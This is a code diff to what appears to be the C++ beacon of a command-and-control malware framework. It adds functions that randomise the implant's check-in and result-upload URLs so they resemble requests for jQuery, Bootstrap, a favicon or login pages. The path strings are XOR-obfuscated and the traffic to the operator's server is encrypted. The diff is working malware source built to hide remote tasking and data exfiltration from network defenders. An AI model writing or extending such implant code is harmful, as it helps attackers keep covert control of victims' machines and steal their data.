@@ -235,13 +235,35 @@ inline std::string http_request(
 
 // ── High-Level C2 Functions ────────────────────────────────────────────────
 
+// ── Malleable URIs ─────────────────────────────────────────────────────────
+
+inline std::wstring get_malleable_path(const std::wstring& original) {
+    int r = rand() % 4;
+    if (r == 0) return original;
+    if (r == 1) return XOR_WDEC(XOR_WSTR(L"/js/jquery-3.6.0.min.js")).c_str();
+    if (r == 2) return XOR_WDEC(XOR_WSTR(L"/static/css/bootstrap.min.css")).c_str();
+    return XOR_WDEC(XOR_WSTR(L"/favicon.ico")).c_str();
+}
+
+inline std::wstring get_malleable_result_path() {
+    int r = rand() % 3;
+    if (r == 0) return XOR_WDEC(XOR_WSTR(L"/api/v1/result")).c_str();
+    if (r == 1) return XOR_WDEC(XOR_WSTR(L"/login.php")).c_str();
+    return XOR_WDEC(XOR_WSTR(L"/upload.aspx")).c_str();
+}
+
+// ── Check-in & Result ──────────────────────────────────────────────────────
+
 // Check in with the C2 server and retrieve pending tasks.
 // Returns the decrypted JSON string with tasks, or "" on failure.
 inline std::string checkin(const C2Config& cfg, const std::string& payload = "") {
     std::wstring method = payload.empty() ? XOR_WDEC(XOR_WSTR(L"GET")).c_str() : XOR_WDEC(XOR_WSTR(L"POST")).c_str();
     std::string body = payload.empty() ? "" : crypto::encrypt(payload);
+    
+    std::wstring path = get_malleable_path(XOR_WDEC(XOR_WSTR(L"/api/v1/ping")).c_str());
+    
     std::string encrypted_response = http_request(
-        cfg, method, XOR_WDEC(XOR_WSTR(L"/api/v1/ping")).c_str(), body, cfg.beacon_id);
+        cfg, method, path, body, cfg.beacon_id);
 
     if (encrypted_response.empty()) return "";
     return crypto::decrypt(encrypted_response);
@@ -267,7 +289,8 @@ inline bool send_result(const C2Config& cfg, const std::string& task_id, const s
     std::string encrypted = crypto::encrypt(json);
     if (encrypted.empty()) return false;
 
-    std::string resp = http_request(cfg, XOR_WDEC(XOR_WSTR(L"POST")).c_str(), XOR_WDEC(XOR_WSTR(L"/api/v1/result")).c_str(), encrypted, cfg.beacon_id);
+    std::wstring path = get_malleable_result_path();
+    std::string resp = http_request(cfg, XOR_WDEC(XOR_WSTR(L"POST")).c_str(), path, encrypted, cfg.beacon_id);
     return !resp.empty();
 }
 
